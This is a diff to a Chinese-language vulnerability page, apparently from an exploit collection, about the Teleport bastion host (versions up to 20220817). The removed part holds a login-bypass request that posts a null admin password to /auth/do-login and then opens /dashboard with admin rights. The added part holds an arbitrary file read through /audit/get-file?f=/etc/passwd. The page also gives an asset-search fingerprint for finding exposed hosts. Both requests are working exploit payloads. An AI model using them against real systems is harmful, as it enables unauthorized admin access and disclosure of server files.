@@ -6,28 +6,22 @@ Teleport堡垒机 get-file接口存在后台任意文件读取漏洞，攻击者
 
 ## 漏洞影响
 
-<a-checkbox checked>Teleport Version <= 20220817</a-checkbox></br>
+Teleport Version <= 20220817
 
 ## 网络测绘
 
-<a-checkbox checked>app="TELEPORT堡垒机"</a-checkbox></br>
+app="TELEPORT堡垒机"
 
 ## 漏洞复现
 
 登录页面
 
-![img](../../../.vuepress/public/img/1660720653270-fcd22c8e-0df1-42ea-aa02-2c94e0770e76-20220823130906124.png)
+![img](../../../.vuepress/public/img/1660720653270-fcd22c8e-0df1-42ea-aa02-2c94e0770e76.png)
 
 登录后使用POC验证
 
 ```php
-POST /auth/do-login
-
-args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
+/audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&offset=0
 ```
 
-![img](../../../.vuepress/public/img/1661087828041-1bf5d666-f5fd-4d69-9099-465b3dd492f2-20220823130904925.png)
-
-code 返回 0 即为成功，再访问 /dashboard 获取管理员权限
-
-![img](../../../.vuepress/public/img/1661087872154-ba6ae117-5a99-43f4-919f-1b22f403ab37-20220823130904719.png)
+![img](../../../.vuepress/public/img/1661232312843-695b528d-23f9-4b57-b925-182f79977734.png)
